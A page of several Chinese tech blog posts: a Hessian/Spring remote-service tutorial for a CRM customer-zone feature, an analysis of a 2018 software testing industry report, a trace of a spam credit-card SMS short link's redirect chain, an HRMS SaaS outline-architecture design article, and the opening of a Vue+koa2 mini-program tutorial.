Dubbo是阿里巴巴SOA服务化治理方案的核心框架，每天为2,000+个服务提供3,000,000,000+次访问量支持，并被广泛应用于阿里巴巴集团的各成员站点。自开源后，已有不少非阿里系公司在使用Dubbo。


Tengine是由淘宝网发起的Web服务器项目。它在Nginx的基础上，针对大访问量网站的需求，添加了很多高级功能和特性。Tengine的性能和稳定性已经在大型的网站如淘宝网，天猫商城等得到了很好的检验。它的最终目标是打造一个高效、稳定、安全、易用的Web平台。


hessian有两种发布服务的方式：

1、使用hessian框架自己提供的HessianServlet发布：com.caucho.hessian.server.HessianServlet
2、和spring整合发布服务：org.springframework.web.servlet.DispatcherServlet



hessian入门案例


服务端开发：第一步：创建一个java web项目，并导入hessian的jar包第二步：创建一个接口
    public interface HelloService {        public String sayHello(String name);        public List<User> findAllUser();    }
第三步：提供上面接口的实现类
    public class HelloServiceImpl implements HelloService {        public String sayHello(String name) {            System.out.println("sayHello方法被调用了");            return "hello " + name;        }        public List<User> findAllUser() {            List<User> list = new ArrayList<User>();            list.add(new User(1, "小艺"));            list.add(new User(2, "小军"));            return list;        }    }
第四步：在web.xml中配置服务
    <servlet>        <servlet-name>hessian</servlet-name>        <servlet-class>com.caucho.hessian.server.HessianServlet</servlet-class>        <init-param>            <param-name>home-class</param-name>            <param-value>com.itheima.HelloServiceImpl</param-value>        </init-param>        <init-param>            <param-name>home-api</param-name>            <param-value>com.itheima.HelloService</param-value>        </init-param>    </servlet>    <servlet-mapping>        <servlet-name>hessian</servlet-name>        <url-pattern>/hessian</url-pattern>    </servlet-mapping>
客户端开发：第一步：创建一个客户端项目(普通java项目即可)，并导入hessian的jar包第二步：创建一个接口（和服务端接口对应）
    public interface HelloService {        public String sayHello(String name);        public List<User> findAllUser();    }
第三步：使用hessian提供的方式创建代理对象调用服务
public class Test {    public static void main(String[] args) throws MalformedURLException {        // 通过hessian提供的工厂类创建一个代理对象，通过这个代理对象可以远程调用服务        HessianProxyFactory factory = new HessianProxyFactory();        HelloService proxy = (HelloService) factory.create(HelloService.class, "http://localhost:8080/hessian_server/hessian");        String ret = proxy.sayHello("test");        System.out.println(ret);        List<User> list = proxy.findAllUser();        for (User user : list) {            System.out.println(user.getId() + "---" + user.getName());        }    }}
4、基于hessian实现定区关联客户
4.1、发布crm服务并测试访问
第一步：创建动态的web项目crm，导入hessian的jar第二步：创建一个crm数据库和t_customer表




第三步：在web.xml中配置spring的DispatcherServlet
    <!-- hessian发布服务的方式：和spring整合发布服务：org.springframework.web.servlet.DispatcherServlet -->    <servlet>        <servlet-name>remoting</servlet-name>        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>        <load-on-startup>1</load-on-startup>    </servlet>    <servlet-mapping>        <servlet-name>remoting</servlet-name>        <url-pattern>/remoting/*</url-pattern>    </servlet-mapping>
第四步：提供接口CustomerService和Customer类、Customer.hbm.xml映射文件CustomerService.java
package cn.itcast.crm.service;import java.util.List;import cn.itcast.crm.domain.Customer;// 客户服务接口 public interface CustomerService {    // 查询未关联定区客户    public List<Customer> findnoassociationCustomers();    // 查询已经关联指定定区的客户    public List<Customer> findhasassociationCustomers(String decidedZoneId);    // 将未关联定区客户关联到定区上    public void assignCustomersToDecidedZone(Integer[] customerIds, String decidedZoneId);}
第五步：为上面的CustomerService接口提供实现类
package cn.itcast.crm.service.impl;import java.util.List;import org.hibernate.Session;import cn.itcast.crm.domain.Customer;import cn.itcast.crm.service.CustomerService;import cn.itcast.crm.utils.HibernateUtils;public class CustomerServiceImpl implements CustomerService {    public List<Customer> findnoassociationCustomers() {        Session session = HibernateUtils.openSession();        session.beginTransaction();        String hql = "from Customer where decidedzone_id is null";        List<Customer> customers = session.createQuery(hql).list();        session.getTransaction().commit();        session.close();        return customers;    }    public List<Customer> findhasassociationCustomers(String decidedZoneId) {        Session session = HibernateUtils.openSession();        session.beginTransaction();        String hql = "from Customer where decidedzone_id=?";        List<Customer> customers = session.createQuery(hql).setParameter(0, decidedZoneId).list();        session.getTransaction().commit();        session.close();        return customers;    }    public void assignCustomersToDecidedZone(Integer[] customerIds, String decidedZoneId) {        Session session = HibernateUtils.openSession();        session.beginTransaction();        // 取消定区所有关联客户        String hql2 = "update Customer set decidedzone_id=null where decidedzone_id=?";        session.createQuery(hql2).setParameter(0, decidedZoneId).executeUpdate();        // 进行关联        String hql = "update Customer set decidedzone_id=? where id=?";        if (customerIds != null) {            for (Integer id : customerIds) {                session.createQuery(hql).setParameter(0, decidedZoneId).setParameter(1, id).executeUpdate();            }        }        session.getTransaction().commit();        session.close();    }}
第六步：在WEB-INF目录提供spring的配置文件remoting-servlet.xml
    <!-- 通过配置的方式对外发布服务 -->    <!-- 业务接口实现类  -->    <bean id="customerService" class="cn.itcast.crm.service.impl.CustomerServiceImpl" />    <!-- 注册hessian服务 -->    <bean id="/customer" class="org.springframework.remoting.caucho.HessianServiceExporter">        <!-- 业务接口实现类 -->        <property name="service" ref="customerService" />        <!-- 业务接口 -->        <property name="serviceInterface" value="cn.itcast.crm.service.CustomerService" />    </bean>
第七步：发布crm服务第八步：在hessian_client客户端调用crm服务获得客户数据注意：拷贝接口CustomerService代码文件放到客户端中，同时必须在hessian_client客户端新建和crm服务端一样的实体Bean目录，如下图所示：




hessian_client客户端调用代码如下：
package com.itheima;import java.net.MalformedURLException;import java.util.List;import org.junit.Test;import com.caucho.hessian.client.HessianProxyFactory;import cn.itcast.crm.domain.Customer;public class TestService {    @Test    public void test1() throws MalformedURLException {        // 通过hessian提供的工厂类创建一个代理对象，通过这个代理对象可以远程调用服务        HessianProxyFactory factory = new HessianProxyFactory();        CustomerService proxy = (CustomerService) factory.create(CustomerService.class, "http://localhost:8080/crm/remoting/customer");        List<Customer> list = proxy.findnoassociationCustomers();        for (Customer customer : list) {            System.out.println(customer);        }        // 上面的演示方式：我们手动创建一个代理对象，通过代理对象去调用，然后获取服务端发布的客户数据。        // 实际的开发方式：我们只需要在applicationContext.xml中配置一下，由spring工厂帮我们去创建代理对象，再将该代理对象注入给action去使用它即可。        // 如何配置呢？配置相关代码如下：        /*        <!-- 配置远程服务的代理对象 -->        <bean id="customerService" class="org.springframework.remoting.caucho.HessianProxyFactoryBean">            <property name="serviceInterface" value="cn.itcast.bos.service.ICustomerService"/>            <property name="serviceUrl" value="http://localhost:8080/crm/remoting/customer"/>        </bean>        */    }}
客户端控制台输出：
cn.itcast.crm.domain.Customer@59b746fcn.itcast.crm.domain.Customer@20f92649cn.itcast.crm.domain.Customer@45409388cn.itcast.crm.domain.Customer@1295e93dcn.itcast.crm.domain.Customer@3003ad53cn.itcast.crm.domain.Customer@41683cc5cn.itcast.crm.domain.Customer@226dcb0fcn.itcast.crm.domain.Customer@562e5771
服务端控制台输出：
Hibernate:     select        customer0_.id as id0_,        customer0_.name as name0_,        customer0_.station as station0_,        customer0_.telephone as telephone0_,        customer0_.address as address0_,        customer0_.decidedzone_id as decidedz6_0_     from        t_customer customer0_     where        customer0_.decidedzone_id is null
4.2、在bos项目中调用crm服务获得客户数据
第一步：在bos项目中导入hessian的jar包第二步：从crm项目中复制CustomerService接口和Customer类到bos项目中第三步：在spring配置文件中配置一个远程服务代理对象，调用crm服务
    <!-- 配置远程服务的代理对象 -->    <bean id="customerService" class="org.springframework.remoting.caucho.HessianProxyFactoryBean">        <property name="serviceInterface" value="com.itheima.bos.crm.CustomerService"/>        <property name="serviceUrl" value="http://localhost:8080/crm/remoting/customer"/>    </bean>
第四步：将上面的代理对象通过注解方式注入到BaseAction中
    @Autowired     protected CustomerService customerService;
第五步：为定区列表页面中的“关联客户”按钮绑定事件，发送2次ajax请求访问DecidedzoneAction，在DecidedzoneAction中调用hessian代理对象，通过代理对象可以远程访问crm获取客户数据，获取数据后进行解析后，填充至左右下拉框中去
    // 设置全局变量：存储选中一个定区时的 定区id    var decidedzoneid;    // 关联客户窗口    function doAssociations(){        // 在打开关联客户窗口之前判断是否选中了一个定区，即获得选中的行        var rows = $("#grid").datagrid("getSelections");        if (rows.length == 1) {            // 打开窗口            $("#customerWindow").window('open');            // 清空窗口中的下拉框内容            $("#noassociationSelect").empty();            $("#associationSelect").empty();            // 发送ajax请求获取未关联到定区的客户(左侧下拉框)            var url1 = "${pageContext.request.contextPath}/decidedzoneAction_findnoassociationCustomers.action";            $.post(url1, {}, function(data) {                // alert(data); // json数据                // 解析json数据，填充至左侧下拉框中去                for (var i = 0; i < data.length; i++) {                    var id = data[i].id;                    var name = data[i].name;                    $("#noassociationSelect").append("<option value='" + id + "'>" + name + "</option>");                }            }, 'json');            decidedzoneid = rows[0].id;            // 发送ajax请求获取关联到当前选中定区的客户(右侧下拉框)            var url2 = "${pageContext.request.contextPath}/decidedzoneAction_findhasassociationCustomers.action";            $.post(url2, {"id":decidedzoneid}, function(data) {                // alert(data); // json数据                // 解析json数据，填充至右侧下拉框中去                for (var i = 0; i < data.length; i++) {                    var id = data[i].id;                    var name = data[i].name;                    $("#associationSelect").append("<option value='" + id + "'>" + name + "</option>");                }            }, 'json');        } else {            // 没有选中或选中多个，提示信息            $.messager.alert("提示信息","请选择一条定区记录进行操作","warning");        }    }
第六步：为“左右移动按钮”绑定事件
    <td>        <input type="button" value="》》" id="toRight"><br/>        <input type="button" value="《《" id="toLeft">        <script type="text/javascript">            $(function() {                // 为右移动按钮绑定事件                $("#toRight").click(function() {                    $("#associationSelect").append($("#noassociationSelect option:selected"));                    $("#associationSelect>option").removeAttr("selected"); // 移除它们默认的选中状态                });                // 为右移动按钮绑定事件                $("#toLeft").click(function() {                    $("#noassociationSelect").append($("#associationSelect option:selected"));                    $("#noassociationSelect>option").removeAttr("selected"); // 移除它们默认的选中状态                });            });        </script>    </td>
第七步：为关联客户窗口中的“关联客户”按钮绑定事件
<script type="text/javascript">    $(function() {        // 为关联客户按钮绑定事件        $("#associationBtn").click(function() {            // 在提交表单之前，选中右侧下拉框中所有的选项            $("#associationSelect option").attr("selected", "selected"); // attr(key, val) 给一个指定属性名设置值            // 在提交表单之前设置隐藏域的值（定区id）            $("input[name=id]").val(decidedzoneid);            // 提交表单            $("#customerForm").submit();        });    });</script>
第八步：在定区Action中接收提交的参数，调用crm服务实现定区关联客户的业务功能
    // 采用属性驱动的方式，接收页面提交过来的参数customerIds（多个，需要用到数组进行接收）    private Integer[] customerIds;    public void setCustomerIds(Integer[] customerIds) {        this.customerIds = customerIds;    }    /**     * 将未关联定区的客户关联到定区上     * @return     */    public String assignCustomersToDecidedZone() {        customerService.assignCustomersToDecidedZone(customerIds, model.getId());        return "list";    }

********************************************************************************************************************************************************************************************************
解析！2018软件测试官方行业报告
前段时间，来自QA Intelligence的2018年度软件测试行业年度调查报告已经隆重出炉了。
《软件测试行业现状报告》旨在为测试行业和全球测试社区提供最准确的信息，是全球最大的测试行业调研报告，来自80多个国家的约1500名受访者参与了此次调研。
这份报告针对软件测试的年度行业现状进行了调研，并给出了非常具体的数据统计。对于软件测试从业人员而言，是一个很好的可以用来了解行业趋势、职业状态的窗口，能为我们职业发展的方向提供强有力的数据支撑。
下面就跟大家一起来解析这份报告都告诉了我们一些什么事情。
 
1.　　首先我们关注的是，测试人员的入行途径：

解析：
可以看到相当部分的入行者对于软件测试这个行业有着直观的兴趣，并且很多是从其他行业和职位转行而来。这说明软件测试工程师这样的职位越来越被知晓和了解，而且对于这个行业很多人持看好的态度。
 
2.　　测试工作占工作时间的百分比：

解析：
这个数据统计分析的潜台词其实是：“软件测试人员是否是专职测试”。从图标中的高占比可以看出，独立专职的测试仍然是业界主流。
 
3.　　测试人员的薪资状况：
 
解析：
我们最关注的当然是中国测试从业人员的薪资，从图表中我们可以明显看出，中国测试从业人员的起步薪资处在比较低的水平。但随着经验的积累，大于五年经验的测试工程师在薪资水平上有可观的提升。整体薪资虽然只是北美和西欧的一半左右，但是也处在一个比较不错的水准。
 
4.　　软件测试的职能定位和团队规模：

解析：
可以看到，测试团队的规模正在逐渐呈现缩减的状态。这与IT行业本身的发展大趋势保持一致，研发节奏的加快，敏捷理念的普遍应用，都使得小规模的团队构成变得越来越流行。
这一行业现状也可以解释测试人员正越来越多的受到项目经理和开发经理的直接领导。
 
5.　　测试人员的额外工作：
 
 
解析：
自动化测试工作的高占比是一个很好的现象，也说明了自动化测试技术在项目内受到了更多的重视和成功应用。而其他工作的高占比也说明，软件测试职位正在渐渐摆脱传统的误解和偏见--即将软件测试简单的与功能测试和测试执行等同起来的偏见。
 
6.　　测试方法和方法论：
 
 
 
解析：
探索性/基于会话的测试仍然是测试方法中的主流。值得注意的是，一些比较新的尝试方法已经在实际工作环境中得到了应用。
 
7.　　静态测试：
 
 
解析：
测试人员对于静态测试，各种评审会议的投入明显增加。
 
8.　　测试人员技能提升方法：

解析：
可以看出，测试人员在技能提升这个领域里，对书籍的依赖有所降低。
 
9.　　测试人员需要的技能：

解析：
沟通能力，自动化技术能力，通用测试方法论占据了前三甲。这些能力你掌握得怎么样呢？
 
10.　　软件测试的对象：
 
解析：
网页测试项目仍然是最主流，而手机项目所占比重已经令人惊讶的超过了桌面应用。网页，APP相关的测试技能是我们测试从业人员的攻坚重点。
 
11.　　软件开发模式：
 
 
解析：
敏捷和类敏捷型项目已经占到了已经极高的百分比，而DevOps模式的使用已经持续数年稳定增长，看来DevOps有必要成为我们测试进修课程上的必备项目。
 
 12.　　自动化测试的应用趋势：

解析：
自动化测试在研发项目里被使用的比例基本保持稳定，而85%的高占比很好的体现了自动化技术的流行。我们还能看出，自动化技术应用最广的领域仍然是功能和回归测试方面。
 
最后我们来看看测试经理对于测试人员素质最关注的要点：

想要转行从业测试，或者想要跳槽寻求进一步发展的同学，可以关注一下这些内容啦。
 
好了，2018行业报告的解析就到这里，希望可以对从业测试的你有所帮助和启发！
 
********************************************************************************************************************************************************************************************************
记录一次垃圾短信网站短链分析
 
垃圾办信用卡短信数据分析

最近天天收到叫我办理某银行的信用卡的短信，让我们感觉和真的一样，其实，很多都是套路，都是别人拿来套用户的信息的。下面我们来看下短信


常理分析
分析一下下面这条短信，首先乍一看这个短信好像很真实的感觉，广发银行，并且带有申请链接。并且号码并不是手机号码，而是短信中心的号码。
深度分析


上网查询该中心号码：



 

可以断定该短信为垃圾短信了



网址分析
通过浏览器访问打开短信中的链接可以看到如下页面跳转



有以下操作：


http://t.cn/EhuFsFj 请求短连接


http://b1.callaso.cn:8181/dcp/tDcpClickLogController.do?tourl&mobile=MTg5NzkxOTg2NTM%3D&destUrl=http%3A%2F%2Fa1.callaso.cn%2Fguangfaxyk_sh_n.html%3Fxbd1008_dpi_c10_zg_gf_7w


 短连接跳转到该网站，应该是一个呗用来做日志请求的


http://s13.cnzz.com/z_stat.php?id=1274023635&online=1 :该网站用于数据统计


http://online.cnzz.com/online/online_v3.php?id=1274023635&h=z7.cnzz.com&on=1&s= ：统计在线时长


http://95508.com/zct7uhBO 访问广发申请信用卡页面


https://wap.cgbchina.com.cn/creditCardApplyIn.do?seqno=cTxRTfSvURuypt-PwsdceQ4a9bBB4b549Bb95Ba9Z&orginalFlowNo=Y6wzfeQcRUxTdvPtu7-wSfyps9m14a49BbB1BbBBB9_DB&createTime=R9tRPRs-TSUdQfpcey14_4B49b_9DaBby&ACTIVITY_ID=lSMTfyRfePpcsS-Qd99BDBBBBB_1b： 跳转广发信用卡申请中心页面


以上是一个请求过程，其实这个过程大概是这样，短连接->请求真实网址->进行网站数据统计->跳转广发申请信用卡页面，然后你再去填写相关信息。
 


其中危机：


由于为短连接，可能黑客可能在中途拦截，或者注入一些抓取数据的脚本，导致用户信息泄露


当你访问该网站时候，你的用户的IP会被CNZZ统计


虽然说现在该网站最终请求的是一个真正的广发银行信用卡申请的网站，这是推广的一个网站



思考


现在的垃圾短信众多，其实办理信用卡的短信一般也不会发送到你的手机上，一般这种短信百分之90都是假的，要么是套取你的个人信息，要么就是推荐你办理信用卡赚取佣金的



********************************************************************************************************************************************************************************************************
HRMS(人力资源管理系统)-SaaS架构设计-概要设计实践
一、开篇
      前期我们针对架构准备阶段及需求分析这块我们写了2篇内容《HRMS(人力资源管理系统)-从单机应用到SaaS应用-架构分析(功能性、非功能性、关键约束)-上篇》《HRMS(人力资源管理系统)-从单机应用到SaaS应用-架构分析(功能性、非功能性、关键约束)-下篇》内容来展开说明。
       本篇主将详细的阐述架构设计过程中概要架构设计要点来和大家共同交流，掌握后续如何强化概要架构设计在架构设计中作用，帮助我们快速确认架构的方向及核心大框架。
      在阐述具体的概要架构工作方法之前，还请大家先参考我们限定的业务场景：
     1、HRMS系统的介绍？（涵盖哪些功能？价值和作用是什么？行业什么情况？）
      请阅读《HRMS(人力资源管理系统)-从单机应用到SaaS应用-系统介绍》
      2、本章分析的内容将围绕4类企业代表的业务场景，（区分不同规模企业的关注点，规模将决定系统的设计方案）
      本篇将围绕4类企业代表来阐述不同规模企业对于HRMS的需求及应用

      A、100人以下的中小企业
      B、500人以下的大中型企业
      C、1000人以上的集团化大企业
      D、全球类型的公司体系（几万人）

      3、架构师在设计该系统时的职责及具备的核心能力是什么？
      请阅读《系统架构系列-开篇介绍》
 
一、关于概要架构阶段
 
1.1、概要架构的定义
       概念架构就是对系统设计的最初构想，就是把系统最关键的设计要素及交互机制确定下来，然后再考虑具体的技术应用，设计出实际架构。概念架构阶段主抓大局，不拘小节，不过分关注设计实现的细节内容。
       概要架构阶段的特点：

Ø满足“架构=组件+交互”的基本定义(所有架构都逃离不了该模式)
Ø对高层组件的“职责”进行笼统界定，并给出高层组件的相互关系
Ø不应涉及接口细节

在讲具体的概要架构设计实践之前，请大家思考以下问题：

Ø不同系统的架构，为什么不同？
Ø架构设计中，应何时确立架构大方向的不同？（功能、质量、约束
 

1.2、行业现状
1.2.1、误将“概要架构”等同于“理想架构”

架构设计是功能需求驱动的，对吗？
架构设计是用例驱动的，对吗？
实际上架构设计的驱动力：功能+质量+约束

1.2.2、误把“阶段”当“视图”

概要架构阶段还是概念视图？
阶段体现先后关系，视图体现并列关系
概要架构阶段根据重大需求、特殊需求、高风险需求形成稳定的高层架构设计成果
 

1.3、主要工作内容及目标

       概念架构是一个架构设计阶段，必须在细化架构设计阶段之前，针对重大需求，特色需求、高风险需求、形成文档的高层架构设计成果。
       重大需求塑造概念架构，这里的重大需求涵盖功能、质量、约束等3类需求的关键内容。
       如果只考虑功能需求来设计概念架构，将导致概念架构沦为“理想化的架构”，这个脆弱的架构不久就会面临“大改”的压力，甚至直接导致项目失败。
 
二、概要架构阶段的方法及科学实践过程是什么？
 

整体可分为3个阶段：

1、通过鲁棒图：初步设计的目标就是发现职责，运用“职责协作链”原理画鲁棒图
2、高层分割：运用成熟的经验及方法论，结合场景选择合适的架构模式来确定系统的层级关系
3、质疑驱动：考虑非功能性需求来不断驱动概要架构设计过程。

2.1、初步设计的目标就是发现职责，运用“职责协作链”原理画鲁棒图

鲁棒图的三种对象：

•边界对象对模拟外部环境和未来系统之间的交互进行建模。边界对象负责接 收外部输入、处理内部内容的解释、并表达或传递相应的结果。
•控制对象对行为进行封装，描述用例中事件流的控制行为。
•实体对象对信息进行描述，它往往来自领域概念，和领域模型中的对象有良好的对应关系。

初步设计原则

•初步设计的目标是“发现职责”，为高层切分奠定基础
•初步设计“不是”必须的，但当“待设计系统”对架构师而言并无太多直接 经验时，则强烈建议进行初步设计
•基于关键功能（而不是对所有功能）、借助鲁棒图（而不是序列图，序列图太细节）进行初 步设计


       关于这几个对象的区别，请参考《HRMS(人力资源管理系统)-从单机应用到SaaS应用-架构分析(功能性、非功能性、关键约束)-上篇》中有描述鲁棒图的基本用法说明。后续本文将直接使用不再复述具体的用法。
       大家看完鲁棒图发现鲁棒图也有实体、控制及边界对象，怎么这么类似web系统时用到的MVC模式，那么我们这里对比下这2个模式的异同点:

       通过上面的对比我们发现，鲁棒图能够更全面的体现架构设计过程中涉及的内容，单独的架构模式更侧重其中的部分架构层次，比如逻辑架构采取MVC的模式。
2.2、高层分割（概念架构形成的具体操作方法）
1）、直接分层

2）、先划分为子系统，再针对每个子系统分层

针对高层分割，我们可以采取分阶段的模式来进行落地实践：

1、直接划分层次：直接把系统划分为多个层次，梳理清晰各层次间的关联关系
2、分为2个阶段：先划分为多个子系统，然后再梳理子系统的层次，梳理清晰没格子系统的层次关系

针对分层模式的引入，这里分享几类划分模式及方法：

1、逻辑层：逻辑层，上层使用下层观念；不关注物理划分，也不关注通用性
2、物理层：分布部署在不同机器上
3、通用性分层：通用性越多，所处层次越靠下

 
2.2.1、Layer：逻辑层
Layer：逻辑层，上层使用下层观念；不关注物理划分，也不关注通用性。Layer是逻辑上组织代码的形式。比如逻辑分层中表现层，服务层，业务层，领域层，他们是软件功能来划分的。并不指代部署在那台具体的服务器上或者，物理位置。

        多层Layer架构模式
       诸如我们常见的三层架构模式，三层架构(3-tier architecture) 通常意义上的三层架构就是将整个业务应用划分为：界面层（User Interface layer）、业务逻辑层（Business Logic Layer）、数据访问层（Data access layer）。区分层次的目的即为了“高内聚低耦合”的思想。在软件体系架构设计中，分层式结构是最常见，也是最重要的一种结构。微软推荐的分层式结构一般分为三层，从下至上分别为：数据访问层、业务逻辑层（又或称为领域层）、表示层。
逻辑层次的架构能帮助我们解决逻辑耦合，达到灵活配置，迁移。 一个良好的逻辑分层可以带来：

A、逻辑组织代码/代码逻辑的清晰度
B、易于维护（可维护性）
C、代码更好的重用（可重用性）
D、更好的团队开发体验（开发过程支持）
 

2.2.2、Tier：物理层
Tier：物理层，各分层分布部署在不同机器上，Tier这指代码运行部署的具体位置，是一个物理层次上的划为，Tier就是指逻辑层Layer具体的运行位置。所以逻辑层可以部署或者迁移在不同物理层，一个物理层可以部署运行多个逻辑层。

       Tier指代码运行的位置，多个Layer可以运行在同一个Tier上的，不同的Layer也可以运行在不同的Tier上，当然，前提是应用程序本身支持这种架构。以J2EE和.NET平台为例，大多数时候，不同的Layer之间都是直接通过DLL或者JAR包引用来完成调用的（例如：业务逻辑层需要引用数据访问层），这样部署的时候，也只能将多个Layer同时部署在一台服务器上。相反，不同的Layer之间如果是通过RPC的方式来实现通信调用的，部署的时候，便可以将不同的Layer部署在不同的服务器上面，这也是很常见的解耦设计。 
一个良好的物理架构可以带来：

A、性能的提升 
B、可伸缩性 
C、容错性
D、安全性

2.2.3、通用性分层
采取通用性分层模式，原则是通用性越多，所处层次越靠下

并且各层的调用关系是自上而下的，越往下通用性越高。
2.3、质疑驱动，不断完善系统架构（质量属性及约束决定了架构的演变）
基于系统中的重大功能来塑造概念架构的高层框架，过程中需要通过质量及约束等非功能性需求不断质疑初步的概念架构，逐步让这个概念架构完善，能够满足及支撑各类质量及约束的要求。具体的操作方法我们可以采取之前篇幅《HRMS(人力资源管理系统)-从单机应用到SaaS应用-架构分析(功能性、非功能性、关键约束)-上篇》中介绍的 “目标-场景-决策表” 来实现。
Ø通过“目标-场景-决策表”分析非功能需求：

通过分析关键的质量及约束内容，给出具体的场景及应对策略，梳理出清晰的决策表，在概念架构阶段融合决策表中给出的方案，最终给出初步的概念架构设计。
 
三、基于前面分析的HRMS系统？我们如何下手开始？
结合前面讲的需求梳理的要点内容，我们结合HRMS系统来进行应用实践，逐步形成概要架构设计。
A、基于RelationRose 来画出鲁棒图、确定系统的边界及关键内容
1)、分析系统中的参与者及应用功能边界：

基于上面我们能够发现我们的核心功能点：

组织管理：主要实现对公司组织结构及其变更的管理；对职位信息及职位间工作关系的管理，根据职位的空缺进行人员配备；按照组织结构进行人力规划、并对人事成本进行计算和管理，支持生成机构编制表、组织结构图等
人事档案：主要实现对员工从试用、转正直至解聘或退休整个过程中各类信息的管理，人员信息的变动管理，提供多种形式、多种角度的查询、统计分析手段
劳动合同：提供对员工劳动合同的签订、变更、解除、续订、劳动争议、经济补偿的管理。可根据需要设定试用期、合同到期的自动提示
招聘管理：实现从计划招聘岗位、发布招聘信息、采集应聘者简历，按岗位任职资格遴选人员，管理面试结果到通知试用的全过程管理
薪酬福利：工资管理系统适用于各类企业、行政、事业及科研单位，直接集成考勤、绩效考核等数据，主要提供工资核算、工资发放、经费计提、统计分析等功能。支持工资的多次或分次发放；支持代扣税或代缴税；工资发放支持银行代发，提供代发数据的输出功能，同时也支持现金发放，提供分钱清单功能。经费计提的内容和计提的比率可以进行设置；福利管理系统提供员工的各项福利基金的提取和管理功能。主要包括定义基金类型、设置基金提取的条件，进行基金的日常管理，并提供相应的统计分析，基金的日常管理包括基金定期提取、基金的补缴、转入转出等。此外，提供向相关管理机关报送相关报表的功能
行政管理：主要提供对员工出勤情况的管理，帮助企业完善作业制度。主要包括各种假期的设置、班别的设置、相关考勤项目的设置，以及调班、加班、公出、请假的管理、迟到早退的统计、出勤情况的统计等。提供与各类考勤机系统的接口，并为薪资管理系统提供相关数据。支持通知公告分发，支持会议室/车辆等资源预定并同步日历，支持调研和投票问卷，支持活动管理的报名/签到/统计等，支持人员的奖惩管理并与人事档案关联，支持活动的抽奖管理等
培训管理：根据岗位设置及绩效考核结果，确定必要的培训需求；为员工职业生涯发展制定培训计划；对培训的目标、课程内容、授课教师、时间、地点、设备、预算等进行管理，对培训人员、培训结果、培训费用进行管理
绩效管理：通过绩效考核可以评价人员配置和培训的效果、对员工进行奖惩激励、为人事决策提供依据。根据不同职位在知识、技能、能力、业绩等方面的要求，系统提供多种考核方法、标准，允许自由设置考核项目，对员工的特征、行为、工作结果等进行定性和定量的考评
配置管理：系统中为了增强系统的兼容性及灵活性，增加了诸多系统开关及配置，为后续满足各类场景提供支撑。其中需要有配置项的动态分类、动态增加、修改等功能
权限管理：
通用权限管理系统，支撑组织、员工、角色、菜单、按钮、数据等涵盖功能及数据全面的权限管理功能
流程管理：提供工作流引擎服务，支持自定义表单及流程，全面支撑HRMS系统中的审批流。
人力资源规划分析：提供全方位的统计分析功能，满足企业人力资源管理及规划，为后续的经营决策提供数据依据。

2)、系统边界
基于上述核心功能点，我们可以梳理出系统的边界，包含如下几个方面：

i、管理员的系统边界
       由于管理员的角色定位已经做了限定，所以他需要有专门的运维管理后台，这个后台提供的功能和业务操作人员的后台功能和界面是完全不同的，所以需要单独的入口，其中的功能模块也是有区别的。所以我们可以得出管理员使用系统时的接入方式和边界。
ii、HR的系统边界
       HR的角色承担业务管理的相关职责，诸如HR模块中的审批环节，他们既有业务发起的操作又有审批环节的操作，所以相对来说HR角色的使用边界会更广泛，相比员工来说。我们发现HR在使用时需要有单独的系统入口，并且分配给他们对应的业务模块及功能。
iii、员工的系统边界
       对于员工来说，HRMS系统中只有部分模块式可以操作使用的，诸如考勤、报销、绩效、查看及维护个人信息等，其他的信息都是由HR填写后用户可以查看，所以从操作便捷来看，员工与HR在业务系统入口上可以是统一入口，通过权限来限制访问边界即可。
iv、公司管理者的边界
        公司的管理者相比员工具有相应的业务及数据管理权限，同时会在审批流环节中承担审核者的身份，诸多业务流程都和管理者相关，所以相比员工来说，公司管理者的业务及操作权限较大，更多的上下级管理方面的业务内容较多，同时还可以完成员工角色操作的相关业务。
3)、数据对象

i、基础数据：系统包含的元数据、服务管理、日志、模块、基础配置、数据字典、系统管理等基础数据管理
ii、业务数据：涵盖机构、员工、HRMS系统业务及流程数据、外部第三方业务联动数据等
iii、其他数据：涵盖诸如文件、图片、视频等其他类型的数据；统计分析后的结果数据；与第三方系统交互或留存的数据等相关内容。其他诸如log日志等数据信息。
B、划分高层子系统

       我们基于上面鲁棒图分析后的核心需求，我们给出系统的宏观的架构轮廓，这里仅考虑用户角色及职责链、从而形成上述的高层分割。
C、质量需求影响架构的基本原理：进一步质疑
       结合前面我们已经梳理过的关键的质量及约束，具体请参考《HRMS(人力资源管理系统)-从单机应用到SaaS应用-架构分析(功能性、非功能性、关键约束)-下篇》，由于篇幅关系我就不详细列举，下面基于这些质量属性及约束我们来进一步完善概要架构：
1)、考虑关键质量属性中的持续可用性及可伸缩性，得出概要架构的中间成果：

2)、考虑关键质量属性中的互操作性，进一步优化概要架构的中间成果：

3)、考虑高性能，除了高负载，还需要考虑静态化、缓存等提升系统性能：

       上面基本形成了一个概要架构的雏形，不过这还不够，我们还有一项关键的内容没有分析，那就是系统约束，我们需要将之前明确的关键约束进行分析拆解，转化为功能或质量要求：
D、分析约束影响架构的基本原理：直接制约、转化为功能或质量需求

分析上述表格的内容，结合上几轮分析后给出的概要架构进行验证，看看这些约束会不会影响该架构内容，然后进行优化调整：

i、业务环境及约束：目前来看，上述概要架构可以支持,不会对于当前的概要架构造成影响。
ii、使用环境约束：之前拟定的PC、App端访问模式已考虑了上述的场景，关于多语言在应用层细节设计时考虑即可。
iii、开发环境约束：概要架构还不涉及细节内容，当前的约束也不会对于架构产生较大影响
iv、技术环境约束：无影响，属于细节层面

E、基于上面几部走，我们得到了初步的概要架构，基本上符合功能、质量及约束的各类要求及场景，得出以下概要架构设计图。

四、概要架构阶段要点总结
基于前面对于概要架构设计推演过程的实践，我们总结概要架构过程的3个核心要点内容如下：
1、首先，需要分析找到HRMS系统中的关键功能、质量及约束
2、其次，利用鲁棒图找到系统的用户、关键功能及职责链，形成初步的子系统的拆分、过程中借助高层分割形成分层结构，不断通过质疑+解决方案的模式，应对及完善质量及约束的要求。
3、最后，通过1、2步实践过程，最终推导出初步的概要架构，为下一步的细化架构提供基础。
希望大家通过上面示例的展示，为大家后续在系统架构设计实践的过程中提供一些帮助。
五、更多信息
关于更多的系统架构方面的知识，我已建立了交流群，相关资料会第一时间在群里分享，欢迎大家入群互相学习交流：
微信群：（扫码入群-名额有限）

********************************************************************************************************************************************************************************************************
Vue+koa2开发一款全栈小程序(5.服务端环境搭建和项目初始化）
1.微信公众平台小程序关联腾讯云
腾讯云的开发环境是给免费的一个后台，但是只能够用于开发，如果用于生产是需要花钱的，我们先用开发环境吧
1.用小程序开发邮箱账号登录微信公众平台
